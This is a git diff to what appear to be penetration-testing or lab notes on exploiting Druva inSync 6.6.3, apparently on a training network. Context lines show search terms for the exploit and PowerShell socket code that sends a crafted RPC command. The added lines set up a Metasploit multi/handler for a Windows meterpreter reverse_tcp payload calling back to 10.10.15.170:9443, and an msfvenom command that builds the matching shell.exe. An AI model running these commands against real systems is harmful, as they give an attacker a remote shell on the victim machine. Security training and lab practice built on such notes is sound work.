@@ -56,6 +56,8 @@ if ($ServiceName) {
 Google Dorking:
 Druva inSync 6.6.3 exploit
 Druva inSync 6.6.3 vulnerability
+
+msf > search <SERVICE_NAME>
 ```
 
 # Listener
@@ -90,4 +92,15 @@ $s.Send($header)
 $s.Send($rpcType)
 $s.Send($length)
 $s.Send($command)
+```
+
+# Metasploit
+```powershell
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.15.170
+msf6 exploit(multi/handler) > set LPORT 9443
+msf6 exploit(multi/handler) > run
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.170 LPORT=9443 -f exe -o shell.exe
 ```
